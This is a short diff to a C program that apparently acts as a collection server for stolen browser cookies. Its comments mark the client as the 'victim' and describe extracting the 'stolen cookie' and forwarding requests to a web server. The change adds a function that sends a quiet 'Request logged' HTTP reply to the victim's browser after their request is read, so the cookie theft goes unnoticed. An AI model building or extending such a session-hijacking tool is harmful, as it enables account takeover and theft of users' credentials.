@@ -183,6 +183,22 @@ static int recv_response_from_web(int web_fd){
 
   return recv_flg;
 }
+/*
+ * send_http_response - Sends a minimal HTTP 200 OK response
+ * @client_fd: File descriptor of the connected client socket
+ */
+static void send_http_response(int client_fd) {
+  const char *response =
+      "HTTP/1.1 200 OK\r\n"
+      "Content-Type: text/html\r\n"
+      "Content-Length: 27\r\n"
+      "Connection: close\r\n"
+      "\r\n"
+      "<html>Request logged</html>";
+
+  ssize_t sent = write(client_fd, response, strlen(response));
+  (void)sent;
+}
 
 /*
  * send_request_to_web
@@ -323,6 +339,8 @@ int main(void) {
       exit(EXIT_FAILURE);
     }
     buffer[bytes_read] = '\0';
+    // SEND RESPONSE TO VICTIM
+    send_http_response(accept_fd);
 
   // EXTRACT COOKIE FROM STOLEN COOKIE
   char cookie[BUFFER_SIZE];
